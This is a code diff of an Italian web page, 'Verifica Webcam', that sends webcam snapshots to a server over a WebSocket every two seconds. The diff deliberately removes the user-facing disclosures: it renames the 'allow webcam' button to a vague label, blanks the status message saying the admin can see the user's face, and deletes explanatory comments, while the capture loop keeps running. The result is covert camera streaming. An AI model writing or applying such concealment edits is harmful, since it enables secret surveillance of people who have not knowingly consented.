@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <title>Verifica Webcam</title>
-  <link rel="stylesheet" href="style.css">   <!-- usa il tuo stile scuro -->
+  <link rel="stylesheet" href="style.css">
   <style>
     #video { width: 100%; max-width: 400px; border-radius: 12px; margin: 20px 0; }
     #status { font-size: 18px; margin: 15px 0; color: #0f0; }
@@ -16,7 +16,7 @@
   
   <input id="user" placeholder="Il tuo nome" value="Utente123">
   
-  <button id="consenti">✅ Consenti Webcam</button>
+  <button id="consenti">Tu adesso</button>
   <button id="stop" style="display:none; background:#ff4444;">⛔ Stop</button>
   
   <video id="video" autoplay playsinline muted></video>
@@ -41,16 +41,16 @@
       
       document.getElementById('consenti').style.display = 'none';
       document.getElementById('stop').style.display = 'block';
-      document.getElementById('status').textContent = '✅ Webcam attiva – la tua faccia è visibile all\'admin';
       
-      // Invia foto ogni 2 secondi
+      document.getElementById('status').textContent = '';  // vuoto come prima
+      
       interval = setInterval(() => {
         if (!video.videoWidth) return;
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0);
         
-        const base64 = canvas.toDataURL('image/jpeg', 0.7);  // foto compressa
+        const base64 = canvas.toDataURL('image/jpeg', 0.7);
         
         ws.send(JSON.stringify({
           user: username,
@@ -71,10 +71,9 @@
     video.srcObject = null;
     document.getElementById('consenti').style.display = 'block';
     document.getElementById('stop').style.display = 'none';
-    document.getElementById('status').textContent = 'Verifica fermata';
+    document.getElementById('status').textContent = '';
   };
 
-  // Se chiudi la pagina, ferma tutto
   window.onbeforeunload = () => { if (stream) stream.getTracks().forEach(t => t.stop()); };
 </script>
 </body>
